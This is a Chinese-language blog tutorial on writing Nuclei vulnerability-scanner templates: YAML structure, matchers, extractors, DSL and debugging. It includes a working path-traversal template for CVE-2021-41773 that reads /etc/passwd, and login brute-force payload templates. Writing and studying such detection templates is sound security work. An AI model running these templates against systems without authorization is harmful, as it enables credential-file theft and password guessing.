> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [blog.csdn.net](https://blog.csdn.net/2301_79518550/article/details/148437683)

### 一、引言

Nuclei 是一个基于 YAML 的开源[漏洞扫描工具](https://so.csdn.net/so/search?q=%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7&spm=1001.2101.3001.7020)，由 ProjectDiscovery 开发，广泛应用于网络安全领域，用于自动化检测 Web 应用、API、服务器等目标中的漏洞。Nuclei 的核心在于其模板（PoC），通过定义请求和匹配规则，快速识别漏洞并提取关键信息。编写高质量的 Nuclei PoC 模板需要深入理解其语法、逻辑以及漏洞特征。本文将详细介绍 Nuclei PoC 的编写方法，包括模板结构、匹配器、提取器、调试技巧和实际案例，帮助安全从业者快速上手并编写高效的 PoC。

### 二、Nuclei PoC 模板基础

#### 2.1 模板结构

Nuclei 模板采用 YAML 格式，结构清晰，包含以下核心部分：

*   **id**：模板的唯一标识符，全局唯一。
*   **info**：漏洞元信息，包括名称、作者、严重性、描述、参考链接和标签。
*   **http/tcp/dns 等**：定义请求逻辑，支持 HTTP、TCP、DNS 等协议。
*   **matchers**：匹配器，定义漏洞检测的条件。
*   **extractors**：提取器，从响应中提取特定数据。

以下是一个简单的 HTTP 模板示例：

```
id: example-vuln-poc
info:
  name: Example Web Vulnerability PoC
  author: your-username
  severity: medium
  description: Detects a generic web vulnerability based on response patterns.
  reference:
    - https://example.com/vuln-info
  tags: vuln, web, http

http:
  - method: GET
    path:
      - "{{BaseURL}}/vulnerable-endpoint"
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "vulnerable"
        part: body
```

#### 2.2 关键字段说明

*   **id**：格式建议为 `vendor-product-vuln-type`，如 `apache-httpd-unauth-access`。
*   **info.severity**：严重性等级（`info`, `low`, `medium`, `high`, `critical`）。
*   **info.tags**：用于分类，如 `cve`, `unauth`, `sqli`。
*   **http**：支持 `method`（GET/POST）、`path`（目标路径）、`headers`（自定义头）等。

### 三、HTTP 请求的编写

#### 3.1 普通 HTTP 请求

Nuclei 支持通过 `method` 和 `path` 定义简单的 HTTP 请求，适合快速检测。例如：

```
http:
  - method: GET
    path:
      - "{{BaseURL}}/admin"
    headers:
      User-Agent: Mozilla/5.0
```

*   `{{BaseURL}}`：动态替换为目标 URL（如 `http://example.com`）。
*   支持多路径扫描，通过列表定义多个 `path`。

#### 3.2 Raw 模式请求

对于复杂请求（如包含特定 Cookie 或 POST 数据），使用 `raw` 模式直接定义原始 HTTP 请求：

```
http:
  - raw:
      - |
        POST /api/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        Content-Length: 45

        {"username":"admin","password":"{{password}}"}
    payloads:
      password:
        - "admin"
        - "password123"
```

*   `{{Hostname}}`：自动替换为目标主机名。
*   `payloads`：支持动态参数（如密码爆破）。

#### 3.3 请求高级配置

*   **redirects**：控制是否跟随重定向（`max-redirects: 3`）。
*   **stop-at-first-match**：命中第一个匹配后停止，优化性能。
*   **cookies**：通过 `headers` 或 `raw` 设置 Cookie。

### 四、匹配器（Matchers）

匹配器是 Nuclei PoC 的核心，用于判断响应是否符合漏洞特征。支持多种类型，结合逻辑条件灵活检测。

#### 4.1 匹配器类型

1.  **status**：匹配 HTTP 状态码。
    
    ```
    matchers:
      - type: status
        status:
          - 200
          - 403
    ```
    
    检测响应状态码为 200 或 403。
2.  **word**：匹配响应中的关键词。
    
    ```
    matchers:
      - type: word
        words:
          - "admin panel"
          - "unauthorized"
        part: body
        case-insensitive: true
    ```
    
    检测响应体中是否包含 “admin panel” 或 “unauthorized”。
3.  **regex**：使用正则表达式匹配。
    
    ```
    matchers:
      - type: regex
        regex:
          - "<title>.*(admin|login).*</title>"
        part: body
    ```
    
    检测标题中是否包含 “admin” 或 “login”。
4.  **dsl**：使用 DSL 表达式进行复杂逻辑匹配。
    
    ```
    matchers:
      - type: dsl
        dsl:
          - "status_code == 200 && contains(body, 'vulnerable')"
    ```
    
    检测状态码为 200 且响应体包含 “vulnerable”。
5.  **binary**：匹配二进制数据，适用于非 HTTP 协议。
6.  **size**：匹配响应大小。
    
    ```
    matchers:
      - type: size
        size:
          - 100-1000
    ```
    
    检测响应体大小在 100-1000 字节。

#### 4.2 匹配器逻辑

*   **matchers-condition**：定义多个匹配器之间的逻辑（`and` 或 `or`）。
    
    ```
    matchers-condition: or
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "error"
    ```
    
    满足状态码 200 或包含 “error” 即可。
*   **part**：指定匹配的响应部分（`body`, `header`, `all`）。
*   **negative**：反向匹配，检测某条件不满足。
    
    ```
    matchers:
      - type: word
        words:
          - "access denied"
        negative: true
    ```
    

### 五、提取器（Extractors）

提取器用于从响应中提取关键信息（如版本号、令牌），支持后续逻辑处理或输出。

#### 5.1 提取器类型

1.  **regex**：提取正则匹配的内容。
    
    ```
    extractors:
      - type: regex
        name: version
        regex:
          - "version: [0-9.]+"
        part: body
    ```
    
    提取类似 “version: 1.2.3” 的版本号。
2.  **kval**：提取键值对（如头部）。
    
    ```
    extractors:
      - type: kval
        name: server
        kval:
          - Server
    ```
    
    提取 Server 头部值（如 “Apache/2.4.41”）。
3.  **dsl**：使用 DSL 提取动态数据。
    
    ```
    extractors:
      - type: dsl
        name: token
        dsl:
          - "regex_find('token: [a-f0-9]{32}', body)"
    ```
    

#### 5.2 提取器应用

*   提取的数据通过 `name` 存储，可用于后续请求或输出。
*   支持多提取器，按顺序执行。
*   常用于版本指纹识别、敏感信息提取等场景。

### 六、DSL（Domain Specific Language）

Nuclei 的 DSL 是一种强大的表达式语言，用于匹配器和提取器中的复杂逻辑。常用函数包括：

*   `contains(str, substr)`：检查字符串是否包含子字符串。
*   `regex_find(regex, str)`：提取正则匹配的内容。
*   `len(str)`：返回字符串长度。
*   `to_lower(str)`：转换为小写。
*   `base64_decode(str)`：Base64 解码。

示例：

```
matchers:
  - type: dsl
    dsl:
      - "status_code == 200 && len(body) > 1000 && contains(to_lower(body), 'admin')"
```

DSL 支持变量（如 `status_code`, `body`, `header`），可实现灵活的逻辑判断。

### 七、调试与优化

#### 7.1 调试技巧

*   **-debug**：运行 `nuclei -t template.yaml -u http://target.com -debug` 查看详细请求 / 响应。
*   **-verbose**：显示更多扫描信息。
*   **日志分析**：检查 `nuclei.log` 文件，定位匹配或提取失败原因。
*   **模板验证**：使用 `nuclei -validate -t template.yaml` 验证 YAML 语法。

#### 7.2 优化建议

*   **减少误报**：匹配器应尽量具体，避免泛化（如仅匹配 “error” 可能误报）。
*   **性能优化**：使用 `stop-at-first-match` 减少不必要请求。
*   **动态变量**：利用 `{{BaseURL}}`、`{{Hostname}}` 等占位符适配目标。
*   **模块化**：将通用逻辑（如指纹识别）拆分为独立模板，复用性更高。

### 八、实际案例：编写 CVE PoC

以 CVE-2021-41773（Apache HTTP Server 路径遍历漏洞）为例，展示 PoC 编写流程。

#### 8.1 漏洞分析

*   **漏洞描述**：Apache 2.4.49/2.4.50 未正确处理 URL 编码，可能导致路径遍历和任意文件读取。
*   **检测方法**：发送特定路径（如 `/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd`），检查响应是否包含文件内容（如 “root:”）。

#### 8.2 PoC 模板

```
id: cve-2021-41773-apache-path-traversal
info:
  name: Apache HTTP Server Path Traversal (CVE-2021-41773)
  author: your-username
  severity: critical
  description: Detects path traversal vulnerability in Apache HTTP Server 2.4.49/2.4.50.
  reference:
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773
  tags: cve, apache, path-traversal

http:
  - method: GET
    path:
      - "{{BaseURL}}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
    headers:
      User-Agent: Mozilla/5.0

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        regex:
          - "root:.*:0:0:"
        part: body

    extractors:
      - type: regex
        name: file_content
        regex:
          - "root:.*:0:0:.*"
        part: body
```

#### 8.3 运行与验证

*   保存为 `cve-2021-41773.yaml`。
*   运行：`nuclei -t cve-2021-41773.yaml -u http://target.com`。
*   验证：检查是否返回 `/etc/passwd` 内容。

### 九、进阶技巧

#### 9.1 动态 Payload

使用 `payloads` 字段支持动态输入（如爆破用户名 / 密码）：

```
http:
  - raw:
      - |
        POST /login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        username={{username}}&password={{password}}
    payloads:
      username:
        - admin
        - user
      password:
        - admin
        - password123
```

#### 9.2 链式请求

通过 `workflows` 实现多步骤请求：

```
id: chained-request-example
info:
  name: Chained Request PoC
  author: your-username
  severity: medium

workflows:
  - template: login.yaml
    matchers:
      - type: word
        words:
          - "login successful"
  - template: access-admin.yaml
```

#### 9.3 非 HTTP 协议

Nuclei 支持 TCP、DNS 等协议。例如，检测开放端口：

```
id: open-port-check
info:
  name: Open Port Detection
  author: your-username
  severity: info

tcp:
  - host:
      - "{{Host}}:22"
    matchers:
      - type: binary
        binary:
          - "SSH-2.0-"
```

### 十、常见问题与解决方案

1.  **误报率高**：
    *   问题：匹配器过于宽泛（如仅匹配 “error”）。
    *   解决：增加具体条件，如结合状态码和正则表达式。
2.  **模板运行缓慢**：
    *   问题：复杂正则或过多请求。
    *   解决：优化正则表达式，使用 `stop-at-first-match`。
3.  **提取失败**：
    *   问题：正则表达式不匹配。
    *   解决：使用 `-debug` 检查响应内容，调整正则。